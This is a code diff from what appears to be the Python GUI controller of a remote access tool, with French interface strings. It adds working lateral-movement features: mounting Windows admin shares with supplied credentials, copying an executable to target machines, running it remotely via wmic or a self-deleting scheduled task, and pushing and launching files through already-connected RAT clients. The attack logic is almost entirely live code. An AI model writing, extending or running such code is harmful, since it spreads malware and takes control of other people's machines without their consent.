         scan_row.pack(fill="x", pady=(0, 6))
@@ -2401,70 +2934,146 @@ DÉMARRAGE RAPIDE:
                 return
             deploy_btn.config(state="disabled")
             deploy_log.config(text=f"Déploiement sur {len(targets)} machine(s)…", fg=self.text_muted)
+            creds = (user_var.get().strip(), pass_var.get())
             def run():
                 results = []
                 for ip, hostname in targets:
-                    ok, msg = _deploy_to(ip, exe_path)
+                    ok, msg = _deploy_to(ip, exe_path, creds)
                     results.append((ip, ok, msg))
                 self.root.after(0, lambda: _show_deploy_results(results))
             threading.Thread(target=run, daemon=True).start()
 
-        def _remote_exec(ip, remote_path):
-            """Try to execute a file on a remote Windows machine. Returns (ok, method, error)."""
-            filename = os.path.basename(remote_path)
-            # remote_path is local UNC style; for execution commands we need the path
-            # as seen from the remote machine: C:\Users\Public\filename.exe
-            target_local = f"C:\\Users\\Public\\{filename}"
+        def _net_use(ip, username, password):
+            """Mount UNC share with explicit credentials. Returns (ok, error)."""
+            cmd = f'net use \\\\{ip}\\C$ /user:"{username}" "{password}"'
+            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+            if r.returncode == 0:
+                return True, None
+            return False, r.stderr.strip() or r.stdout.strip()
 
-            # Method 1: wmic process call create (no auth prompt, works same subnet)
+        def _net_use_delete(ip):
+            subprocess.run(f'net use \\\\{ip}\\C$ /delete /yes',
+                           shell=True, capture_output=True, timeout=10)
+
+        def _smb_copy(ip, src_path, username, password):
+            """Copy src_path via SMB admin shares. Returns (ok, dest_unc, error)."""
+            filename = os.path.basename(src_path)
+            # Candidates: C$\Users\Public, ADMIN$\Temp, C$\Windows\Temp
+            shares = [
+                (f"\\\\{ip}\\C$\\Users\\Public\\{filename}",   f"C:\\Users\\Public\\{filename}"),
+                (f"\\\\{ip}\\ADMIN$\\Temp\\{filename}",         f"C:\\Windows\\Temp\\{filename}"),
+                (f"\\\\{ip}\\C$\\Windows\\Temp\\{filename}",   f"C:\\Windows\\Temp\\{filename}"),
+            ]
+            used_net_use = False
+            if username:
+                ok, err = _net_use(ip, username, password)
+                if not ok:
+                    return None, None, f"net use échoué : {err}"
+                used_net_use = True
+            last_err = "Aucun partage accessible"
+            for unc, local in shares:
+                try:
+                    shutil.copy2(src_path, unc)
+                    return unc, local, None
+                except Exception as e:
+                    last_err = str(e)
+            if used_net_use:
+                _net_use_delete(ip)
+            return None, None, f"Copie SMB échouée sur tous les partages : {last_err}"
+
+        def _remote_exec(ip, target_local, username, password):
+            """Try to execute a file on a remote Windows machine. Returns (ok, method, error)."""
+            cred_args = ""
+            if username:
+                cred_args = f'/user:"{username}" "{password}" '
+
+            # Method 1: wmic with optional credentials
             try:
-                cmd = (f'wmic /node:"{ip}" process call create '
-                       f'"{target_local}"')
+                cmd = (f'wmic /node:"{ip}" {cred_args}process call create "{target_local}"')
                 r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                 if r.returncode == 0 and "ReturnValue = 0" in r.stdout:
                     return True, "wmic", None
+                wmic_err = r.stderr.strip() or r.stdout.strip()
             except Exception as e:
                 wmic_err = str(e)
 
-            # Method 2: schtasks /create + /run + /delete (immediate one-shot task)
+            # Method 2: schtasks with optional credentials
             task_name = f"EduDeploy_{int(time.time())}"
             try:
-                create_cmd = (f'schtasks /create /s {ip} /tn "{task_name}" '
-                              f'/tr "{target_local}" /sc once '
-                              f'/st 00:00 /f')
-                run_cmd   = f'schtasks /run /s {ip} /tn "{task_name}"'
-                del_cmd   = f'schtasks /delete /s {ip} /tn "{task_name}" /f'
+                u_args = f'/u "{username}" /p "{password}" ' if username else ""
+                create_cmd = (f'schtasks /create /s {ip} {u_args}/tn "{task_name}" '
+                              f'/tr "{target_local}" /sc once /st 00:00 /f')
+                run_cmd    = f'schtasks /run /s {ip} {u_args}/tn "{task_name}"'
+                del_cmd    = f'schtasks /delete /s {ip} {u_args}/tn "{task_name}" /f'
                 r1 = subprocess.run(create_cmd, shell=True, capture_output=True, text=True, timeout=15)
                 if r1.returncode == 0:
                     subprocess.run(run_cmd, shell=True, capture_output=True, timeout=10)
                     subprocess.run(del_cmd, shell=True, capture_output=True, timeout=10)
                     return True, "schtasks", None
+                sched_err = r1.stderr.strip() or r1.stdout.strip()
             except Exception as e:
                 sched_err = str(e)
 
-            return False, None, "wmic et schtasks ont échoué (droits admin requis)"
+            return False, None, (f"wmic: {wmic_err} | schtasks: {sched_err} "
+                                 f"— droits admin requis ou pare-feu bloquant")
 
-        def _deploy_to(ip, src_path):
-            filename = os.path.basename(src_path)
-            # Check if already connected
+        def _deploy_via_rat_client(ip, src_path):
+            """Deploy via an already-connected RAT client (no admin rights needed)."""
             with self.lock:
-                connected_ips = [c["address"][0] for c in self.clients.values()]
-            if ip in connected_ips:
-                return False, "Machine déjà connectée en tant que client actif"
-
-            # Step 1: copy via SMB admin share
-            smb_dst = f"\\\\{ip}\\C$\\Users\\Public\\{filename}"
+                client_entry = next(
+                    (c for c in self.clients.values() if c["address"][0] == ip), None
+                )
+            if client_entry is None:
+                return False, "Aucun client RAT connecté depuis cette IP"
+            sock = client_entry["socket"]
+            key  = client_entry.get("key")
+            filename = os.path.basename(src_path)
+            # Upload to %TEMP% on the remote machine
+            remote_dest = f"%TEMP%\\{filename}"
             try:
-                shutil.copy2(src_path, smb_dst)
+                with open(src_path, "rb") as f:
+                    data = f.read()
+                send_msg(sock, f"upload {remote_dest}", key)
+                send_msg(sock, data, key)
+                ack = recv_msg_str(sock, key)
+                if not ack or "[!]" in ack:
+                    return False, f"Upload RAT échoué : {ack}"
+                # exec_bg launches the file as the RAT user without blocking the socket
+                send_msg(sock, f"exec_bg {remote_dest}", key)
+                exec_ack = recv_msg_str(sock, key)
+                if exec_ack and "[!]" in exec_ack:
+                    return False, f"Upload OK mais exécution échouée : {exec_ack}"
+                return True, f"Envoyé + lancé via client RAT ({ip})"
             except Exception as e:
-                return False, f"Copie SMB échouée : {e}"
+                return False, f"Erreur via client RAT : {e}"
 
-            # Step 2: execute remotely
-            ok, method, err = _remote_exec(ip, smb_dst)
+        def _deploy_to(ip, src_path, creds):
+            username, password = creds
+
+            # Strategy 1: via existing RAT connection (no admin needed)
+            with self.lock:
+                rat_connected = any(c["address"][0] == ip for c in self.clients.values())
+            if rat_connected:
+                ok, msg = _deploy_via_rat_client(ip, src_path)
+                if ok:
+                    return True, msg
+                # Fall through to SMB if RAT deploy failed
+
+            # Strategy 2: SMB copy + remote exec (requires admin or valid credentials)
+            unc, local_path, err = _smb_copy(ip, src_path, username, password)
+            if unc is None:
+                if username:
+                    return False, f"Copie SMB échouée (credentials fournis mais refusés) : {err}"
+                return False, (f"Copie SMB échouée (pas de droits admin). "
+                               f"Astuce : renseigne les identifiants admin de la machine cible. {err}")
+
+            ok, method, exec_err = _remote_exec(ip, local_path, username, password)
+            if username:
+                _net_use_delete(ip)
             if ok:
                 return True, f"Copié + lancé via {method} sur {ip}"
-            else:
-                return False, f"Copié sur {ip} mais exécution échouée : {err}"
+            return False, (f"Copié sur {ip} (partage {unc.split(chr(92))[3]}) "
+                           f"mais exécution échouée : {exec_err}")
 
         def _show_deploy_results(results):
             deploy_btn.config(state="normal")
